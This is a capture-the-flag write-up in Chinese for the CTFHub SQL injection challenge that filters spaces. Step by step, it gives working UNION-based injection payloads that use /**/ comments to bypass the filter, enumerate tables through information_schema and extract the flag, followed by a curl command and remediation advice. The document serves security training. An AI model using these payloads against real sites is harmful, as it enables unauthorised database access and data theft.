CTFHub - Web - SQL注入 - 过滤空格

# CTFHub # Web # SQL注入 # 过滤空格 # 注释绕过

一、题目信息

  • 题目名称：过滤空格
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：绕过空格过滤，利用 SQL 注入读取数据库中的 flag。

二、确认注入点和过滤规则

首页提供 id 查询参数。提交 id=1 后正常返回：

ID: 1
Data: ctfhub

提交单引号 id=1' 后没有返回数据，说明参数被带入 SQL 查询，且闭合方式需要继续验证。

题目提示空格被过滤。直接提交包含普通空格的 Payload 会失败，因此使用 MySQL 行内注释 /**/ 代替空格作为语法分隔符。先用真假条件验证：

id=1/**/and/**/1=1#

ID: 1
Data: ctfhub
id=1/**/and/**/1=2#

无查询结果

条件为真时正常返回，条件为假时无数据，说明 /**/ 已成功绕过空格过滤，且该位置属于数字型注入。

这里的 /**/ 不是简单删除空格，而是利用 SQL 注释充当词法分隔符，使 1、and、1=1 等 Token 能够被数据库正确解析。

三、确定回显列数

使用不存在的负数 -1 避开原记录，并通过 UNION 放置两个测试值：

id=-1/**/union/**/select/**/1,2#

ID: 1
Data: 2

两个位置均成功回显，可确认查询共有两列，且第 1、2 列都是可见回显位。后续将查询结果放在第 2 列。

四、获取数据库基本信息

id=-1/**/union/**/select/**/database(),version()#

ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1

当前数据库为 sqli。接下来通过 information_schema 枚举当前库中的表名。

五、枚举表和字段

查询当前数据库中的全部表名：

id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#

ID: 1
Data: wfjmjifoio,news

除业务表 news 外，还存在随机表名 wfjmjifoio。继续联合查询表名与字段名：

id=-1/**/union/**/select/**/1,group_concat(table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()#

ID: 1
Data: wfjmjifoio:yglexuhhcr,news:id,news:data

其中 0x3a 是冒号的十六进制形式，用于分隔表名和字段名。目标数据位于 wfjmjifoio.yglexuhhcr。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。

六、读取 Flag

id=-1/**/union/**/select/**/1,group_concat(yglexuhhcr)/**/from/**/wfjmjifoio#

ID: 1
Data: ctfhub{34eb4198e6d99531ab71520a}

使用 curl 复现完整请求。参数中的 # 需要交给 --data-urlencode 编码，避免被浏览器或 Shell 当成片段标识符：

curl.exe -sS -G --data-urlencode "id=-1/**/union/**/select/**/1,group_concat(yglexuhhcr)/**/from/**/wfjmjifoio#" "http://<target>/"

七、最终 Flag

ctfhub{34eb4198e6d99531ab71520a}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的整数类型校验，只接受合法数字。
  • 不要依赖过滤少量字符来防御 SQL 注入；黑名单很容易被注释、编码等方式绕过。
  • 生产环境关闭 SQL 语句回显和详细数据库错误信息。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问。

九、解题总结

本题的注入流程与普通数字型 UNION 注入一致，区别在于普通空格被过滤。使用 /**/ 代替 SQL 语句中的空格，可以保持关键字和表达式之间的语法分隔，从而完成真假验证、字段枚举与 Flag 读取。实际利用时还需注意将 # URL 编码为 %23，或使用 curl --data-urlencode 自动处理。
